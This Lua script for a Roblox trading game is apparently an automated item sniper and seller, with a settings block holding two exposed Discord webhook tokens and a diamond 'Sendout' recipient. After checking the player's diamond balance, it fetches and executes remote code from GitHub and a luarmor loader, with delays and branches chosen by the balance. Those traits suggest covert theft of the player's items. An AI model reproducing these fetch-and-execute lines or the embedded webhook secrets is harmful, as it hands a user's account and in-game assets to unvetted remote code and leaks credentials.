game:GetService("RunService"):Set3dRenderingEnabled(false)

--local randomNumber = math.random(1, 100)

--if randomNumber >= 95 then
--  wait(35)
--  pcall(function()
--      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
--      loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
--  end)
--end

getgenv().Settings = {
    Sniper = {
        Active = true,
        Items = {
            --// Example Settings, everything is editable.
            SearchTerminal = {
                --["Instant Luck Potion 4"] = {Class = "Consumable", Price = 20000},
                ["Crystal Key Upper Half"] = {Class = "Misc", Price = 1000, InventoryLimit = 2500},
                --["Crystal Key Lower Half"] = {Class = "Misc", Price = 1000},
            },
        },
        Serverhop = {
            ["Switch Servers"] = true,
            ["Teleport Delay (s)"] = 3,
            ["Save # Last Joined Servers"] = 5,
            ["Constant Terminal Searching"] = true,
            ["Terminal Searches per Item"] = 3,
        },
        Webhook = {
            ["URL"] = "https://discord.com/api/webhooks/1306028399231504446/JtKuRJhyypxzu48tPITDrhjmx_2xXX24MzWlHM0Pp-fy3QSPCqhCM6ngX4bY3XsVuPAW",
            ["Send Embeds"] = true,
            ["Remove Username"] = false,
            ["Global Snipes"] = true,
        },
        StopParams = {
            ["Limits Reached"] = false,
            ["Diamonds Hit: 250k"] = false,
            ["60 Minutes"] = false,
            ["Switch To Selling"] = false,
        },
    },
    Seller = {
        Active = false,
        Items = {
            ["All Items"] = {Class = "Lootbox", Price = "15%"},
        },
        Serverhop = {
            ["Switch Servers"] = true,
            ["Teleport Delay (m)"] = 10,
        },
        Webhook = {
            ["URL"] = "https://discord.com/api/webhooks/1306028281417433168/cgRvOM0Pzj2rl1TrDxzGtbSf91lSU0NlR1XuDTarmh4vamcKSkP_s4iP23NfCrslgI3J",
            ["Send Embeds"] = true,
            ["Remove Username"] = true,
        },
        StopParams = {
            ["Item Runout"] = true,
            ["Diamonds Hit: 1b"] = false,
            ["60 Minutes"] = false,
            ["Switch To Sniping"] = false,
        },
        Other = {
            ["Auto Accept Mail"] = true,
            ["Diamonds Hit: 1b Sendout"] = "anilkenim",
            ["Always Try Adding Listings"] = true,
            ["Never Join Friendslist"] = false,
        },
    },
}


local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
local Inventory = Save.Inventory

local Services = {
    Players = game:GetService("Players"),
}

local Player = Services.Players.LocalPlayer

local GemsAmount = 0

for id, table in pairs(Inventory.Currency) do
    if table.id == "Diamonds" then
        GemsAmount = table._am or 0
        break
    end
end

if GemsAmount > 25000 then
  pcall(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/717430e3bbde3530feb824de729fcc90.lua"))()
  end)
else
  pcall(function()
    wait(35)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/gosniper.lua"))()
  end)
end
